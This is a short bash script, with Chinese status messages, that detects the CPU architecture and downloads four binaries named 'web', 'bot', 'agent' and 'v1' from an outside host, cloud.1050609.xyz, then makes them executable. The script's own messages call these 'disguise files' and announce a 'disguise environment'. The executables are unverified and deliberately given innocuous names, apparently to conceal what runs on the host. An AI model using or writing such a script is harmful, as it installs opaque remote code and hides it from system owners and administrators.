#!/bin/bash
ARCH=$(uname -m)
echo "检测到当前系统架构为: $ARCH"

if [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
    echo "正在拉取 ARM 架构伪装文件..."
    curl -L https://cloud.1050609.xyz/f/qvu4/web -o web
    curl -L https://cloud.1050609.xyz/f/Grf0/bot -o bot
    curl -L https://cloud.1050609.xyz/f/Xjim/agent -o agent
    curl -L https://cloud.1050609.xyz/f/9Ztn/v1 -o v1
else
    echo "正在拉取 AMD 架构伪装文件..."
    curl -L https://cloud.1050609.xyz/f/R9IX/web -o web
    curl -L https://cloud.1050609.xyz/f/ApSW/bot -o bot
    curl -L https://cloud.1050609.xyz/f/0RUL/agent -o agent
    curl -L https://cloud.1050609.xyz/f/bgCa/v1 -o v1
fi

echo "赋予执行权限..."
chmod +x web bot agent v1
echo "伪装环境部署完毕！"
